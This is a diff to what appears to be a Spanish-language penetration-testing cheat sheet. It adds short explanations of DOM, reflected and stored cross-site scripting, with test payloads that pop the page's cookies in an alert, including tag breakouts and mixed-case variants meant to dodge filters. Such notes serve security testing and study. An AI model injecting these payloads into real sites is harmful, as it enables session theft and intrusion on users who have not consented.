@@ -514,17 +514,28 @@ ________________________________________________________________________________
 
 # Cuando se puede inyectar codigo en JavaScript
 
-# XSS DOM #
+# XSS DOM # El script se ejecuta dentro del Document Object Model. Se incluye en la url y no se envia al servidor.
 # Comprobar si es subceptible al XSS probar
-	<script>alert(prueba);</script>
-# Extraer las
+	<script>alert(test);</script>
+# Extraer las cookies
 	<script>alert(document.cookie);</script>
 	#<script>alert(document.cookie);</script>
 	" ></option></select><img src=x onerror="alert(document.cookie)">
 
-# XSS Reflected #
+# XSS Reflected # El script inyectado se refleja fuera del servidor, enviando una peticion y el servidor mostrando de vuelta.
+# Comprobar si es subceptible al XSS probar
+	<img src=x onerror="alert(test)">
+# Extraer las cookies	
+	<img src=x onerror="alert(document.cookie)">
 
-# XSS Stored #
+# XSS Stored # El script inyectado se almacena en el servidor, afectando a todo el que entre.
+# Comprobar si es subceptible al XSS probar
+	<img src=x onerror="alert(test)">
+# Extraer las cookies
+	<img src=x onerror="alert(document.cookie)">
+	<sCrIpT>alert(document.cookie);</ScRiPt>
+	<ImG src=x onerror="alert(document.cookie)">
+
 
 SQLi
 _________________________________________________________________________________________
